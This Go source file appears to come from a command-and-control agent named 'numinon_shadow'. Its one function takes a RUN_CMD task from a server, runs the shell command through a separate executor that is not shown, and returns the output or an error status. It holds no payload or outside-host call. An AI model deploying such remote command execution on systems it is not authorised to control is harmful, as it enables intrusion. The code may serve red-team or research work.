package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/command"
	"numinon_shadow/internal/models"
	"strings"
)

// orchestrateRunCmd is the orchestrator for the RUN_CMD command.
func (a *Agent) orchestrateRunCmd(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.RunCmdArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal RunCmdArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR RUN_CMD ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|✅ RUN_CMD ORCHESTRATOR| Task ID: %s. Shell Command Executed: %s",
		task.TaskID, args.CommandLine)

	// Call the "doer" function
	runCmdResult, err := command.DoRunCmd(args)

	// Prepare the final TaskResult
	finalResult := models.AgentTaskResult{
		TaskID: task.TaskID,
		Output: nil,
		Error:  "",
	}

	if err != nil {
		finalResult.Error = err.Error()

		log.Printf("|❗ERR RUN_CMD ORCHESTRATOR| Run_Cmd execution failed for Task ID %s: %s.",
			task.TaskID, finalResult.Error)

		// NOTE THIS NEEDS TO BE FIXED AND ADAPTED ONCE ACTUAL COMMAND HAS BEEN IMPLEMENTED IN DOER
		errorString := finalResult.Error
		switch {
		case strings.Contains(errorString, "validation:"):
			finalResult.Status = models.StatusFailureInvalidArgs
		case strings.Contains(errorString, "File not found"):
			finalResult.Status = models.StatusFailureFileNotFound
		case strings.Contains(errorString, "Permission denied"):
			finalResult.Status = models.StatusFailurePermissionDenied
		default:
			finalResult.Status = models.StatusFailureReadError
		}
	} else {
		// If we get here it means our doer call succeeded

		finalResult.Output = runCmdResult.Output

		finalResult.Status = models.StatusSuccess
		log.Printf("|✅ RUN_CMD ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
			task.TaskID, len(finalResult.Output))
	}
	return finalResult
}
